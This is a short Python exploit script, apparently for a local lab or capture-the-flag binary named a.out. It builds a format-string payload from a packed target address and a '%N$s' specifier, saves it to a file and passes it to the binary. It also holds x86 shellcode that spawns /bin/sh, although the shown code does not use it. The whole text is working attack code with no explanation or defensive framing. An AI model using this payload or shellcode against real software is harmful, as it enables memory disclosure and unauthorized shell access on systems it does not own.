import sys
import struct
from subprocess import Popen

target_addr = int(sys.argv[1], 16)
index = int(sys.argv[2])

shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf = struct.pack('<I', target_addr)
print('type %s' % type(buf))
s = "%%%d$s" % index
buf += s.encode()
print('buf %s' % buf)

path = './resources/buf.txt'

with open(path, 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()
